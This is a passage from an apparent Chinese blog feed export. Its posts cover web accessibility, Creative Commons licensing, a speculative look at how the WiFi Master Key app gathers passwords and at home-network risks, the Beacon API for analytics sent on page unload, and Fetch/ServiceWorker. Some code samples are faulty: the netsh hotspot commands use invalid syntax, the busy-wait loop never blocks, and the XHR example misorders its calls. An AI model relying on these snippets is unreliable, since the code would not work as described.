的观点：</p><blockquote><p>信息无障碍的目的在于让所有人包括残障人、老年人、儿童等都可以很方便的平等的获取信息。目前国内的现状是人们普遍缺乏对无障碍的理解和认识，同时也缺少有效的法律支持。</p><p>很长一段时间内最主要的工作是普及无障碍意识。推动信息无障碍是个长期的持续的工作。</p><p>现在大多数的信息障碍来源于信息提供者。互联网信息障碍主要来自于网站和软件的开发者。</p><p>这几年来，我一直与软件开发者交流，最大的感触是，他们是有爱心的，是愿意做无障碍工作的，唯一缺乏的是无障碍意识，他们不知道他们的产品会给残障人带来麻烦。而一旦他们了解到这些障碍之后，都是很愿意进行改进的。</p><p>所以，普及无障碍意识，从开发者入手是最直接、最有效的方式。</p></blockquote><p>无障碍技术并没有很难，只是我们没把这件事当回事。后续我会发布一些信息无障碍相关的技术研究文章，希望可以带动一部分人一起做这件事情。</p>]]></content>
      
      
      <categories>
          
          <category> 网页无障碍 </category>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息无障碍 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>谈一谈博客的著作版权问题</title>
      <link href="/blog/2016/02/27/about-cc/"/>
      <url>/blog/2016/02/27/about-cc/</url>
      
        <content type="html"><![CDATA[<p>古人对「著作」和「编述」两个词的含义区分的比较明显，子曰：“述而不作，信而好古”，意思是，只负责传承古代的优秀文化，不搞改革，相信并且喜欢玩味古代的东西。那个时代产出的知识体量小，而现在不一样，信息时代，很多内容都是在沉淀的知识中做微创新、微著作。</p><p>如果要把博客文章划进这两个词，著作或许更加适合些。我们在博客中的论述，稍微有点含量的，都可以称之为著作。</p><span id="more"></span><p>在中国，盗版应该是一个深入骨髓的词语，如果哪天发现身边的朋友没有使用盗版的软件、看盗版的数据、听盗版的音乐，你可能会乜斜着眼睛诧异的盯着这个人（心里默念着土豪）。近两年，国家在盗版的打击上做了大量工作，尤其是书籍和音乐两块。</p><p>最近看到技术圈的内容聚合平台如雨后春笋般崛起，然而有极少数的朋友在分享的时候并不太在意版权的问题。所以今天想把这个问题再提到纸面上说说，加深大家的印象。</p><h3 id="大众没有版权保护的意识"><a href="#大众没有版权保护的意识" class="headerlink" title="大众没有版权保护的意识"></a>大众没有版权保护的意识</h3><p>近几年，国内出现了好几个支持静态部署的平台，加之技术学习门槛越来越低，很多人都玩起了博客。我平时也喜欢看别人写的东西，每每 Google 搜索都会掉进几个不错的博客，看到有意思的内容，便会削一个苹果坐在一旁，边吃边看🙈。</p><p>大约有一半的朋友会在自己的文章中备注版权信息，告诉路人，文章可以拿走，但是要记得带上名字和原文链接，这个习惯很好。可是也有很多朋友并没有意识到这个问题。前段看到团队号召各位攻城师把工作上不错的想法提炼成专利，并对我们做了相关的知识普及，我发现，很多专利其实并不需要什么高深的技术。其实著作也是类似的，用心去写，搞不好你某篇文章就可以给你带来一些正向影响。</p><p>以前的著作，权限控制很极端，一种是不给任何权利，一种是把所有权利都给出去。你是否也经常看到 Apache 协议、MIT 协议等等对代码开源的权利控制？我之前整理了一份文档，感兴趣的可以看看：<a href="https://www.barretlee.com/blog/2013/08/13/cb-license/">《五种开源协议的比较(BSD,Apache,GPL,LGPL,MIT)》</a>，适当对著作权做保留，一方面有利于将自己的知识成果分享出去，另一方面也是对自己权益的维护。</p><h3 id="Creative-Commons"><a href="#Creative-Commons" class="headerlink" title="Creative Commons"></a>Creative Commons</h3><p>博客文章写作一般会用到 Creative Commons 相关协议，中文叫做「知识共享协议」，简称 CC。对权利的归类分为四种：</p><ul><li>署名（Attribution，简写为 BY）：必须提到原作者。</li><li>非商业用途（Noncommercial，简写为 NC）：不得用于盈利性目的。</li><li>禁止演绎（No Derivative Works，简写为 ND）：不得修改原作品, 不得再创作。</li><li>相同方式共享（Share Alike，简写为 SA）：允许修改原作品，但必须使用相同的许可证发布。</li></ul><p>使用时，可以对以上随机组合，用的比较多的组合有这么几个：</p><ul><li><a href="//creativecommons.org/licenses/by-nc-sa/2.5/cn/">署名-非商业性使用-相同方式共享 2.5 中国大陆 (CC BY-NC-SA 2.5 CN)</a></li><li><a href="//creativecommons.org/licenses/by-nc-nd/3.0/cn/">署名-非商业性使用-禁止演绎 3.0 中国大陆 (CC BY-NC-ND 3.0 CN)</a></li><li><a href="//creativecommons.org/licenses/by-sa/4.0/deed.zh">署名-相同方式共享 4.0 国际 (CC BY-SA 4.0)</a></li></ul><p>我的博客使用上面第二种协议，可以在任何媒介以任何形式复制、发行博客作品，但是要保留署名，不允许商用，不能对内容进行修改和再创作。还算比较宽松，对一般的聚合平台而言，在醒目位置留下作者名字和原文链接即可。</p><h3 id="不止于协议"><a href="#不止于协议" class="headerlink" title="不止于协议"></a>不止于协议</h3><p>大家都知道，技术内容是在不断革新的，上半年还在流行的东西，下半年可能就已经淹没在历史洪流之中。博客文章中的表述可能存在诸多错误或者一段时间后内容过时了，当作者发现这些错误的时候，便会对内容做修改，copy 方式的转载最大的问题就是没法即时与原文保持同步，倘若转载时还不保留原文地址，信息的传递就会出现断层，一些错误的表述和内容，容易对刚入门的新人造成负面的刻板印象，这一点是需要各位朋友在转载文章的时候注意的！</p><p>好吧，说了这么多，就当我啰嗦了下。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
            <tag> Creative Commons </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WiFi 万能钥匙原理和危害探究</title>
      <link href="/blog/2016/02/23/wifi-key/"/>
      <url>/blog/2016/02/23/wifi-key/</url>
      
        <content type="html"><![CDATA[<p>本文不会从代码角度分析 WiFi 万能钥匙这个软件是如何「破解」密码的，主要从使用这个软件后的感受出发，分析它可能会用到的手段以及可能存在的风险。</p><span id="more"></span><p>以前因为好奇，安装了 WiFi 万能钥匙，但是从来没有打开过，当时我心里很清楚，蹭网的前提就是自己家被蹭。晚上刷微博看到一张图片，iphone 设备的 WiFi 列表中竟然出现了「🔑一键免费连接🔑」相关的提示，我用自己的手机测试了下，果真如此：</p><p><img src='//ww1.sinaimg.cn/mw690/6c0378f8gw1f1a96kbjacj20ku112who.jpg' alt='WiFi 破解效果列表' style="width:300px;"><!-- ![WiFi 破解效果列表](../blogimgs/2016/02/23/20160203_82a6609a.png) --></p><h3 id="软件对-WiFi-密码的攫取"><a href="#软件对-WiFi-密码的攫取" class="headerlink" title="软件对 WiFi 密码的攫取"></a>软件对 WiFi 密码的攫取</h3><p>获取安装该软件用户连接过的 WiFi 的密码，这是 WiFi 万能钥匙需要攻克的第一个难题，攻克之后，从一个用户身上可以挖到 1-10 个 WiFi id 和 WiFi 密码。攻克的方式嘛，可以去网上搜罗下，很多保存下来的密码都是明文的，或者是只经过了简单的加密操作，如果用户 root 了自己的手机，软件可以随意获取。</p><p>显然，WiFi 万能钥匙有一个自己的云端，储存了大量从用户手机里攫取到的 WiFi 信息，每个储存单元应该包含了如下信息（按照重要性从上往下依次排列）：</p><ul><li>WiFi 容器的物理地址（MAC 信息）</li><li>WiFi 的密码</li><li>WiFi 名称</li><li>WiFi 容器的区域信息</li><li>WiFi 容器的 IP 地址</li></ul><p>由于民众对快速上网的极度渴望，偶然听到或者看到有这么个神器，当机立断将其下载到了手机上，在这两年时间间，该软件的用户量达到了 5 亿之多，月活跃用户在 2.3 亿（数据来自网络），其用户量之多、粘性之强，恐怕只有社交类的软件可以比拟了。由此，也可以想象 WiFi 万能钥匙的云端数据库有多么庞大。</p><h3 id="WiFi-的连接"><a href="#WiFi-的连接" class="headerlink" title="WiFi 的连接"></a>WiFi 的连接</h3><p>初次打开软件的时候，你应该看到了它会向你申请「获取位置信息」的请求，目的有两个，第一是获取你所在区域的大概位置，然后将该位置附近的 WiFi 信息全部缓存到你的客户端，这样做可以大大地减少对服务器的压力，其二，目前 WiFi 万能钥匙也会做一些商品&#x2F;商家的推广，拿到位置信息方便个性化投放。</p><p><strong>1. 密码匹配</strong></p><p>以前手机没有提供权限给它获取 WiFi 列表，所以软件会引导用户将 WiFi 列表界面截图，然后通过图片分析拿到 WiFi 名称。而如今，iOS 设备不仅提供了获取周边 WiFi 列表的权限，而且还允许软件对每个 WiFi 进行文字备注，如最上面破解效果列表图所示。</p><p>所以我猜测，以前软件只能通过 WiFi 名称进行匹配，而现在可以使用 WiFi 的其他信息如（MAC 地址）进行匹配，匹配度更高，因为 WiFi 名称可能会存在重复问题。</p><p><strong>2. 撞库分析</strong></p><p>拿到了几个亿的数据，自然少不了对数据进行统计和分析，拿到一些常用的弱口令，如八个8、四个123、八个0等，了解路由设置和 WiFi 设置的人本来就不多，很多上门服务的师傅一般就将密码设置成简单好记的，这也很大程度提高了撞库的成功率。对于拿不到密码的 WiFi，软件毫无疑问会作出这种尝试，成本低、成功率还高。</p><p><strong>3. 暴力破解</strong></p><p>暴破应该不会用于实时的密码获取，而是会在沉默状态下，对未知 WiFi 进行暴力破解，破解成功的 WiFi 上传到云端服务器。这种方式可能在软件上线的初期使用，只是我的一种猜测。</p><h3 id="被蹭网存在的危害"><a href="#被蹭网存在的危害" class="headerlink" title="被蹭网存在的危害"></a>被蹭网存在的危害</h3><p>如果家里的网络被小白用户蹭了，无非就是大家同时上网的时候，网速会慢一点，而如果你家网络被一个具备黑客素质的人蹭上了，这个时候可能需要引起注意了。</p><p>如果你家里有 WiFi，那么一定会有一个路由器吧，路由器的密码还是初始状态的 guest&#x2F;admin 么，或者被你设置成了六个8？如果我是这个攻击者，一定会想各种办法拿到你们家路由器的密码，如果运气好进去了，下一步要做的事情就是把路由器的网关设置成我自己的电脑，然后各种截获和注入。</p><p>如果没有攻克路由器，也可以利用在一个局域网内的条件，通过共享、网络广播等各种欺骗手段忽悠小白用户上当，方法总是很多的。只要打开一个口子，基本上你的手机&#x2F;电脑就被控制了，投毒、欺骗、诱骗等，能用上的都会用上。</p><h3 id="如何防止被蹭"><a href="#如何防止被蹭" class="headerlink" title="如何防止被蹭"></a>如何防止被蹭</h3><p>你手机上没有安装 WiFi 万能钥匙，也没有将密码告诉旁边的邻居、路人，结果发现自己的网络还是被蹭到了。为啥呢？回想下，原来上个月你家外甥过来了，然后他手机上有这个软件…</p><p>防止被蹭的最好的方式就是，密码不告诉任何人，即便是外甥。现在的路由器默认可以设置两个 WiFi，并且可以对 sub-WiFi 进行流量限制。当然，有些 WiFi 做的比较成熟，可以通过自己的手机监控连接的设备，然后设置白名单和黑名单。不过估计用这种 WiFi 的人不会很多，一般的 WiFi 也支持在 Web 界面上控制上网设备。</p><p>还有一种方式是，在路由器中，将无线设置的 SSID 广播改为「隐藏」，周边设备就没办法找到你家的 WiFi 网络了。</p><h3 id="常规的-WiFi-热点设置原理"><a href="#常规的-WiFi-热点设置原理" class="headerlink" title="常规的 WiFi 热点设置原理"></a>常规的 WiFi 热点设置原理</h3><p>分享一段跑题的内容。</p><p>以前使用 Window&#x2F;Linux 系统的时候，尝试过将自己的电脑作为热点把网络分享给其他同学，刚开始使用了叫做 猎豹WiFi 的软件，后来自己也开始敲代码折腾，事实上，在 window 下一行代码就能产生一个无线热点：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netsh wlan <span class="built_in">set</span> myWiFi mode=allow ssid=YOUR_WiFi_NAME key=WiFi_PASSWORD</span><br></pre></td></tr></table></figure><p>上述命令会在系统的某个位置生成一个文件，其中 key 是明文保存的，然后通过如下命令就能开启 WiFi：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开启 WiFi</span></span><br><span class="line">net wlan start myWiFi </span><br><span class="line"><span class="comment"># 关闭 WiFi</span></span><br><span class="line">net wlan stop myWiFi </span><br></pre></td></tr></table></figure><p>Linux 下稍微费劲些，配合 hostpd 和 dnsmasq，不过也是差不多几行代码的事情。</p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>本文主要是对 WiFi 万能钥匙这个软件相关功能的一些猜测，具体如何实现，可以去网上观摩下骇客们对软件代码的反编译。</p>]]></content>
      
      
      <categories>
          
          <category> 网络交互 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WiFi万能钥匙 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>页面跳转时，统计数据丢失问题探讨</title>
      <link href="/blog/2016/02/20/navigator-beacon-api/"/>
      <url>/blog/2016/02/20/navigator-beacon-api/</url>
      
        <content type="html"><![CDATA[<p>为了更好地了解用户对产品的使用情况，业务中，我们经常会收到埋点统计的需求，比如：</p><ul><li>收集一段时间内用户光标在页面中的运动情况，包括光标移动、点击等行为</li><li>统计用户滚屏行为</li><li>统计用户在站点的停留时长</li><li>收集页面链接的点击数量等</li></ul><span id="more"></span><p>无论是移动端还是 PC 端，相信很多朋友都遇到了这么几个十分让人头疼的问题：</p><ul><li>统计某个链接的点击量，但是这个链接点击后直接跳转走了</li><li>统计页面时长问题，unload 的时候发送的统计丢失了</li><li>统计脚本还没有初始化，用户不感兴趣已经走人了等</li></ul><p>如果我们把这样的数据交给了产品同学，可能会让他们对用户行为产生错误的认知，一定程度上影响产品的下一步改善。</p><h3 id="传统解决方案"><a href="#传统解决方案" class="headerlink" title="传统解决方案"></a>传统解决方案</h3><p>上面提到的问题，从技术角度可以归纳为两点：</p><ul><li>用户关闭页面过早，统计脚本还未加载&#x2F;初始化完成</li><li>用户关闭或者跳出页面的时候，请求未发出</li></ul><p>针对第一点，概率较小，一般的处理方式就是，不要把统计脚本参合到其他脚本中，单独加载，并且放在前头，让它优先加载。很多公司的做法是，不让开发者关心统计脚本的加载，用户请求页面的时候，Nginx 会在 Body 开始标签位置注入一段脚本。</p><p>对于问题二，处理方案就有很多了。</p><p><strong>1. 阻塞式的 Ajax 请求</strong></p><p>还记得 <code>XMLHttpRequest::open</code> 方法的第三个参数吧，如果设置为 false 就是同步加载，</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;unload&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(),</span><br><span class="line">  xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain;charset=UTF-8&quot;</span>);</span><br><span class="line">  xhr.<span class="title function_">open</span>(<span class="string">&#x27;post&#x27;</span>, <span class="string">&#x27;/log&#x27;</span>, <span class="literal">false</span>); <span class="comment">// 同步请求</span></span><br><span class="line">  xhr.<span class="title function_">send</span>(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>阻塞页面关闭，当然可以在 <code>readState</code> 为 2 的时候就 abort 请求，因为我们不关心响应的内容，只要请求发出去就行了。</p><p><strong>2. 暴力的死循环</strong></p><p>原理跟上面类似，只不过是使用一个空的死循环阻塞页面关闭，</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;unload&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="title function_">send</span>(data);</span><br><span class="line">  <span class="keyword">var</span> now = +<span class="keyword">new</span> <span class="title class_">Date</span>;</span><br><span class="line">  <span class="keyword">while</span>(<span class="keyword">new</span> <span class="title class_">Date</span> - now &gt;= <span class="number">10</span>) &#123;&#125; <span class="comment">// 阻塞 10ms</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>3. 发一个图片请求阻塞</strong></p><p>大部分浏览器都会等待图片的加载，趁这个机会把统计数据发送出去</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;unload&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="title function_">send</span>(data);</span><br><span class="line">  (<span class="keyword">new</span> <span class="title class_">Image</span>).<span class="property">src</span> = <span class="string">&#x27;http://example.com/s.gif&#x27;</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>以上提到的几个方案都是一个原理，让浏览器继续保持阻塞状态，等数据发送出去后再跳转，这里存在的问题是：</p><ul><li>少量浏览器下可能不奏效</li><li>等待一会儿再跳转，用户体验上打了折扣，尤其是移动端上</li></ul><p>是否有更好的方案解决这个问题呢，前端同学秉着「小强精神」也提出了两个可实践的方案。</p><h3 id="优化方案"><a href="#优化方案" class="headerlink" title="优化方案"></a>优化方案</h3><p>不就是埋点统计数据嘛，非得在当前页面发送出去？优化方案的思路具有一定的跳跃性，我们考虑将数据在下跳页中发送，那么问题就转换为，如何将数据传递给下跳页？</p><p>对于链接点击量的统计，我们可以将链接信息通过 url 传递给下跳页，传递思路如下：</p><p><strong>1. url 传参</strong></p><p>通过数组标识一个链接的位置信息，如 <code>[站点id，页面id，模块id，链接index]</code>，通过四个参数可以惟一标识链接位置属性，使用 URL param 参数将数组数据传递给下跳页，等待由下跳页将数据发送出去。</p><p>这里存在的问题是，下跳页中必须部署同样的统计脚本，但对一个系统来说，这是很容易做到的。我们也不会在自己的网页上放其他网站的链接吧，所以整个数据的统计都在一个闭环内。</p><p><strong>2. 通过 <code>window.name</code> 传递数据</strong></p><p><code>window.name</code> 是浏览器给我们开放的一个接口，设置该属性的值后，即便页面发生了跳转，这个值依然不会变化，并且可以跨域使用。</p><p>这里存在的问题是，该属性可能被开发者用于其他途径。我们可以限制开发者直接使用 <code>window.name</code>，封装接口，通过接口调用，如 aralejs 提供的 <a href="//github.com/aralejs/name-storage">nameStorage</a>，</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">nameStorage.<span class="title function_">setItem</span>(key, value);</span><br><span class="line">nameStorage.<span class="title function_">getItem</span>(key);</span><br><span class="line">nameStorage.<span class="title function_">removeItem</span>(key);</span><br></pre></td></tr></table></figure><p>储存形式为：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">    scheme                  nameStorage datas</span><br><span class="line">      |                            |</span><br><span class="line"><span class="comment">------------           ------------------------</span></span><br><span class="line">nameStorage:origin-<span class="type">name</span>?key1=value1&amp;key2=value2</span><br><span class="line">            <span class="comment">-----------</span></span><br><span class="line">                 |</span><br><span class="line">         <span class="keyword">window</span> origin <span class="type">name</span></span><br></pre></td></tr></table></figure><p>以上虽然基本解决了数据丢失和体验差的问题，但是这也很大程度依赖于开发者的编程习惯，如不能随便玩耍 <code>window.name</code>；也对系统有一定的要求，必须在所有页面上部署同样的埋点脚本。</p><h3 id="这件事情应该交给浏览器来解决"><a href="#这件事情应该交给浏览器来解决" class="headerlink" title="这件事情应该交给浏览器来解决"></a>这件事情应该交给浏览器来解决</h3><p>上面提到的各种方案，不乏黑科技，然而存在的问题还是一大堆，如果团队的开发者执行力不够，中途容易出现各种麻烦。所以真正能够解决这个问题的，必然还是浏览器本身！</p><p>为什么不能给用户提供这样一个 API，即使页面跳转了，也能够将上个页面的请求发出去呢？庆幸的是，W3C 工作组也想到了这个问题，提出了 <code>Beacon API</code> 的 <a href="//www.w3.org/TR/beacon/">草案</a>。</p><p><code>Beacon API</code> 允许开发者发送少量错误分析和上报的信息，它的特点很明显：</p><ul><li>在空闲的时候异步发送统计，不影响页面诸如 JS、CSS Animation 等执行</li><li>即使页面在 unload 状态下，也会异步发送统计，不影响页面过渡&#x2F;跳转到下跳页</li><li>能够被客户端优化发送，尤其在 Mobile 环境下，可以将 Beacon 请求合并到其他请求上，一同处理</li></ul><p><code>sendBeacon</code> 函数挂在在 navigator 上，在 unload 之前，这个函数一定是被初始化了的。其使用方式为：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;unload&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  navigator.<span class="title function_">sendBeacon</span>(<span class="string">&#x27;/collector&#x27;</span>, data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>navigator.sendBeacon(url, data);</code>，第一个参数为数据上报的地址，第二个参数为要发送的数据，支持的数据格式有：ArrayBufferView, Blob, DOMString, 和 FormData。</p><p><code>Beacon</code> 的还有一个非常实用的移动端使用场景，当用户从浏览器切换到其他 app 界面或者 Home 屏的时候，部分浏览器默认会停止页面脚本的执行，如果在这个时候使用了 unload 时间，可能会让你失望，因为 unload 事件并不会触发，此时，<code>Beacon</code> 就派上用途了，它是不会受影响的。</p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>本文是对页面打点丢失问题的简单探讨，枚举了我们通常会用到的一些解决方案，可能不是很完善，如果你有更好的建议，可以提出来。</p><p>很多问题，我们绞尽脑汁，可能很少会考虑，这个问题是不是应该有我们来解决，或者说这个问题交给谁处理是最恰当的。本文的探讨可以看到，浏览器本身才是最好的问题解决方，当网站流量变大之后，上面提到的丢失问题就更加明显，这也迫使浏览器本身做了改善，自然也在情理之中。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Beacon API </tag>
            
            <tag> navigator.sendBeacon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>当前端也拥有 Server 的能力</title>
      <link href="/blog/2016/02/16/when-fe-has-the-power-of-server/"/>
      <url>/blog/2016/02/16/when-fe-has-the-power-of-server/</url>
      
        <content type="html"><![CDATA[<p>今天看了不少文章，比较感兴趣的是 Cache API。它是浏览器 Request&#x2F;Response 的缓存管理工具，其使用风格和运用场景让我瞬间联想到了 ServiceWorker 和 Fetch API，相信很多同学也多次看到过这两个东西，本文会对它们做一个简洁的介绍，并谈一谈我对这些新玩具的看法。</p><span id="more"></span><h3 id="Fetch-API"><a href="#Fetch-API" class="headerlink" title="Fetch API"></a>Fetch API</h3><p>传统的 XMLHttpRequest，出了两个版本，在 XHR2.0 中引入了跨源请求、上传进度事件和对二进制数据的支持等，这些 API 的增强让 AJAX 可以很方便地与 HTML5 API 相结合，例如 File System API、Web Audio API、WebGL 等，让前端对音视频的处理和富客户端元素的处理更加有亲和力。</p><p>作为一个与后端交互的通道，XHR2.0 的接口封装依然过于底层。看看 jQuery 对 AJAX 的封装，再回头看看我们今天要介绍的 Fetch API，不得不惊叹，浏览器已经在应用层面思考着功能的拓展，依托着 Promise 产出了十分友好的新一套接口。</p><p>以前我们使用 XHR 去请求一个资源，会这么做：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Just getting XHR is a mess!</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>) &#123;</span><br><span class="line">  request = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">ActiveXObject</span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    request = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&#x27;Msxml2.XMLHTTP&#x27;</span>);</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      request = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&#x27;Microsoft.XMLHTTP&#x27;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">request.<span class="property">onreadstatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="comment">// handle data;</span></span><br><span class="line">&#125;;</span><br><span class="line">request.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://barretlee.com/test.json&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">request.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>而使用 Fetch API，我们只需要：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://barretlee.com/test.json&#x27;</span>).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">response</span>) &#123; </span><br><span class="line">  <span class="comment">// Convert to JSON</span></span><br><span class="line">  <span class="keyword">return</span> response.<span class="title function_">json</span>();</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">val</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(val); </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>对于 Text&#x2F;HTML 和 Blob 等格式的请求和转化也是异常方便：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Text/HTML 请求</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/next/page&#x27;</span>).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">response</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> response.<span class="title function_">text</span>();</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">text</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(text); </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Blob 流</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;flowers.jpg&#x27;</span>).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">response</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> response.<span class="title function_">blob</span>();</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">blob</span>) &#123;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;img&#x27;</span>).<span class="property">src</span> = <span class="variable constant_">URL</span>.<span class="title function_">createObjectURL</span>(blob);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Fetch API 让我们更加关注请求和响应之间的交互，而不是聚焦在如何请求和如何处理响应两个问题上。</p><p>当然，它也存在几个相比 XHR 不足的地方，首先它不能 abort 请求，同时也不能获取请求过程中的 progress 状态，当然也没有 timeout 超时处理。Fetch API 是基于 Promise 的，而 Promise 的状态只有 pending、resolve、reject，不会出现诸如 pending(80%) 的状态提示；我们也无法对一个 Promise chains 做 abort 处理，这些都是能够理解并且接受的。</p><p>我也相信，Fetch API 有能力提供这些状态信息和附加的 API，只是在这个不成熟的环境下，它目前不需要迈这么大的步子。</p><h3 id="ServiceWorker"><a href="#ServiceWorker" class="headerlink" title="ServiceWorker"></a>ServiceWorker</h3><p>ServiceWorker，简单而言就是一个放在前端的 HTTP 拦截器，比如我们要请求一个不存在的 URI 如：<code>/test/a.html</code>，直接请求就会响应 404，而如果我们预先在 ServiceWorker 中注册了这个地址，并且指定响应内容，当再次请求时，你会看到结果是存在的，举个例子：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- demo.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">navigator.<span class="property">serviceWorker</span>.<span class="title function_">register</span>(<span class="string">&quot;worker.js&quot;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">scope</span>: <span class="string">&quot;/test/a.html&quot;</span></span></span><br><span class="line"><span class="language-javascript">&#125;).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">fetch</span>(‘/test/a.<span class="property">html</span>’).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">response</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> response.<span class="title function_">text</span>();</span></span><br><span class="line"><span class="language-javascript">  &#125;).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">text</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(text); </span></span><br><span class="line"><span class="language-javascript">  &#125;);</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在 demo.html 文件中，我们看到，将 <code>/test/a.html</code> 的请求交给 <code>worker.js</code> 来处理，处理方式为：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// workker.js</span></span><br><span class="line"><span class="title function_">addEventListener</span>(<span class="string">&quot;fetch&quot;</span>, <span class="keyword">function</span>(<span class="params">evt</span>) &#123;</span><br><span class="line">  evt.<span class="title function_">respondWith</span>(<span class="keyword">new</span> <span class="title class_">Response</span>(“<span class="title class_">Hi</span>, <span class="title class_">Barret</span> <span class="title class_">Lee</span>”));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在 <code>demo.html</code> 的回调中使用 Fetch  获取<code>/test/a.html</code> 这个并不存在的内容，被 ServiceWorker 捕获，交给 <code>worker.js</code> 处理并响应 <code>Hi, Barret Lee</code> 的文本，整个设计思路十分清晰，很轻松地拦截了来自客户端的请求，并作出了响应。</p><p>由于 ServiceWorker 是对 Promise 友好的，响应时也可以模拟服务器休眠状态：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title 